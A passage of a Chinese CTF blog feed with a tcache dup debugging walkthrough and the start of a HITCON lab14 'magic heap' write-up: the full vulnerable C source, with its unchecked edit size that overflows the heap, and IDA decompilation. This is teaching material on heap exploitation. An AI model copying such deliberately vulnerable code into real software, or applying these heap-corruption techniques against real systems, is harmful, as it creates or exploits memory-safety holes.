list，也就是说chunk1中的next指针指向其本身的chunk_data。<br>由于接下来有两次malloc，因此先来看第一次malloc之后的内存，对malloc下断点：<br>命令：b malloc<br>继续调试程序，由于对malloc下断点，因此程序会停在malloc的push rbp，也就是说程序并没有进行第一次malloc，因此我们输入c继续运行程序，结果如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br><br>Free <span class="hljs-title function_">chunk</span> <span class="hljs-params">(tcache)</span> | PREV_INUSE<br>Addr: 0x601250<br>Size: 0x21<br>fd: 0x601260<br><br>Top chunk | PREV_INUSE<br>Addr: 0x601270<br>Size: 0x20d91<br><br>pwndbg&gt; bin<br>tcachebins<br>0x20 [  1]: 0x601260 ◂— 0x601260<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: 0x601000<br>Size: 0x251<br><br>Free <span class="hljs-title function_">chunk</span> <span class="hljs-params">(tcache)</span> | PREV_INUSE<br>Addr: 0x601250<br>Size: 0x21<br>fd: 0x601260<br><br>Top chunk | PREV_INUSE<br>Addr: 0x601270<br>Size: 0x20d91<br><br>pwndbg&gt; x/100gx 0x601000<br>0x601000:0x00000000000000000x0000000000000251 #tcache_perthread_struct<br>0x601010:0x00000000000000010x0000000000000000<br>    <span class="hljs-meta">#count=1</span><br>0x601020:0x00000000000000000x0000000000000000<br>0x601030:0x00000000000000000x0000000000000000<br>0x601040:0x00000000000000000x0000000000000000<br>0x601050:0x00000000006012600x0000000000000000<br>......（省略内容均为空）<br>0x601250:0x00000000000000000x0000000000000021 #chunk1<br>0x601260:0x00000000006012600x0000000000000000<br>0x601270:0x00000000000000000x0000000000020d91 #top_chunk<br>......（省略内容均为空）<br>0x601310:0x00000000000000000x0000000000000000<br>pwndbg&gt; bin<br>tcachebins<br>0x20 [  1]: 0x601260 ◂— 0x601260<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/16gx &amp;main_arena<br>0x7ffff7dcfc40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc50 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc60 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc70 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc80 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc90 &lt;main_arena+80&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfca0 &lt;main_arena+96&gt;:0x00000000006012700x0000000000000000<br>    #指向top_chunk<br>0x7ffff7dcfcb0 &lt;main_arena+112&gt;:0x00007ffff7dcfca00x00007ffff7dcfca0<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>为了防止程序跑飞，接下来对代码的第17行下断点，看一下第二次malloc之后的结果：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601000</span><br>Size: <span class="hljs-number">0x251</span><br><br>Free <span class="hljs-title function_">chunk</span> <span class="hljs-params">(tcache)</span> | PREV_INUSE<br>Addr: 0x601250<br>Size: 0x21<br>fd: 0x601260<br><br>Top chunk | PREV_INUSE<br>Addr: 0x601270<br>Size: 0x20d91<br><br>pwndbg&gt; bin<br>tcachebins<br>0x20 [  0]: 0x601260 ◂— ...<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/16gx &amp;main_arena<br>0x7ffff7dcfc40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc50 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc60 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc70 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc80 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc90 &lt;main_arena+80&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfca0 &lt;main_arena+96&gt;:0x00000000006012700x0000000000000000<br>0x7ffff7dcfcb0 &lt;main_arena+112&gt;:0x00007ffff7dcfca00x00007ffff7dcfca0<br>pwndbg&gt; x/100gx 0x601000<br>0x601000:0x00000000000000000x0000000000000251 #tcache_perthread_struct <br>0x601010:0x00000000000000000x0000000000000000<br>0x601020:0x00000000000000000x0000000000000000<br>0x601030:0x00000000000000000x0000000000000000<br>0x601040:0x00000000000000000x0000000000000000<br>0x601050:0x00000000006012600x0000000000000000<br>    #执行chunk1_data<br>......<span class="hljs-params">(省略内容均为空)</span><br>0x601250:0x00000000000000000x0000000000000021 #chunk1<br>0x601260:0x00000000006012600x0000000000000000<br>0x601270:0x00000000000000000x0000000000020d91 #top_chunk<br>......<span class="hljs-params">(省略内容均为空)</span> <br>0x601310:0x00000000000000000x0000000000000000<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>上面就是tcache_dup的攻击方式，看起来好像没有什么用，下篇文章中的例子会体现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tcache-Attack中的Tcache-dup（基础）&quot;&gt;&lt;a href=&quot;#Tcache-Attack中的Tcache-dup（基础）&quot; class=&quot;headerlink&quot; title=&quot;Tcache Attack中的Tcache dup（基础）&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="Tcache bin Attack" scheme="https://kylinxin.github.io/tags/Tcache-bin-Attack/"/>
    
  </entry>
  
  <entry>
    <title>HITCON Training lab14 magic heap</title>
    <link href="https://kylinxin.github.io/2023/09/15/HITCON%20Training%20lab14%20magic%20heap/"/>
    <id>https://kylinxin.github.io/2023/09/15/HITCON%20Training%20lab14%20magic%20heap/</id>
    <published>2023-09-15T04:58:29.000Z</published>
    <updated>2023-09-13T15:02:03.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="unsortedbin-attack（例题）"><a href="#unsortedbin-attack（例题）" class="headerlink" title="unsortedbin_attack（例题）"></a><strong>unsortedbin_attack（例题）</strong></h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><p class='item-img' data-src='https://s2.loli.net/2023/09/13/AfgB9YjLMT6Sbxv.png'><img src="https://s2.loli.net/2023/09/13/AfgB9YjLMT6Sbxv.png" alt="Snipaste_2023-09-13_21-07-19.png"></p><p>文件没开PIE，got表可写，开启了Canary和NX保护，64位程序。</p><h2 id="程序源代码"><a href="#程序源代码" class="headerlink" title="程序源代码"></a>程序源代码</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_input</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size)</span> {<br>  <span class="hljs-type">int</span> ret;<br>  ret = read(<span class="hljs-number">0</span>, buf, size);<br>  <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Error"</span>);<br>    _exit(<span class="hljs-number">-1</span>);<br>  }<br>}<br><br><span class="hljs-type">char</span> *heaparray[<span class="hljs-number">10</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> magic = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"       Magic Heap Creator       "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 1. Create a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 2. Edit a Heap                 "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 3. Delete a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 4. Exit                        "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice :"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">size_t</span> size = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {<br>    <span class="hljs-keyword">if</span> (!heaparray[i]) {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>      size = atoi(buf);<br>      heaparray[i] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>      <span class="hljs-keyword">if</span> (!heaparray[i]) {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>      }<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap:"</span>);<br>      read_input(heaparray[i], size);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"SuccessFul"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-type">size_t</span> size;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">10</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> (heaparray[idx]) {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>    size = atoi(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap : "</span>);<br>    read_input(heaparray[idx], size);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">10</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> (heaparray[idx]) {<br>    <span class="hljs-built_in">free</span>(heaparray[idx]);<br>    heaparray[idx] = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">l33t</span><span class="hljs-params">()</span> { system(<span class="hljs-string">"cat ./flag"</span>); }<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {<br>    menu();<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">switch</span> (atoi(buf)) {<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      create_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      edit_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      delete_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4869</span>:<br>      <span class="hljs-keyword">if</span> (magic &gt; <span class="hljs-number">4869</span>) {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congrt !"</span>);<br>        l33t();<br>      } <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"So sad !"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid Choice"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br></code></pre></td></tr></tbody></table></figure><h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h2><h3 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      menu();<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>      v3 = atoi(buf);<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">3</span> )<br>        <span class="hljs-keyword">break</span>;<br>      delete_heap();<br>    }<br>    <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">3</span> )<br>    {<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4869</span> )<br>      {<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)magic &lt;= <span class="hljs-number">4869</span> )<br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"So sad !"</span>);<br>        }<br>        <span class="hljs-keyword">else</span><br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congrt !"</span>);<br>          l33t();<br>        }<br>      }<br>      <span class="hljs-keyword">else</span><br>      {<br>LABEL_17:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid Choice"</span>);<br>      }<br>    }<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>    {<br>      create_heap();<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_17;<br>      edit_heap();<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>看一看就行，接下来看具体函数功能</p><h3 id="l33t-存在后门函数"><a href="#l33t-存在后门函数" class="headerlink" title="l33t 存在后门函数"></a>l33t 存在后门函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">l33t</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">"cat /home/magicheap/flag"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">.bss:<span class="hljs-number">00000000006020B</span>9                 align <span class="hljs-number">20</span>h<br>.bss:<span class="hljs-number">00000000006020</span>C0                 public magic<br>.bss:<span class="hljs-number">00000000006020</span>C0 ; __int64 magic<br>.bss:<span class="hljs-number">00000000006020</span>C0 magic           dq ?                    ; DATA XREF: main:loc_400D05↑r<br>.bss:<span class="hljs-number">00000000006020</span>C8                 align <span class="hljs-number">20</span>h<br>.bss:<span class="hljs-number">00000000006020E0</span>                 public heaparray<br>.bss:<span class="hljs-number">00000000006020E0</span> ; heap *heaparray[<span class="hljs-number">10</span>]<br>.bss:<span class="hljs-number">00000000006020E0</span> heaparray       dq ?                    ; DATA XREF: create_heap+<span class="hljs-number">30</span>↑r<br>.bss:<span class="hljs-number">00000000006020E0</span>                                         ; create_heap+<span class="hljs-number">8</span>C↑w ...<br></code></pre></td></tr></tbody></table></figure><p>magic ：00000000006020C0</p><p>heap_ptr ：00000000006020E0</p><h3 id="meau函数"><a href="#meau函数" class="headerlink" title="meau函数"></a>meau函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"       Magic Heap Creator       "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 1. Create a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 2. Edit a Heap                 "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 3. Delete a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 4. Exit                        "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice :"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>打印菜单</p><h3 id="create函数"><a href="#create函数" class="headerlink" title="create函数"></a>create函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title 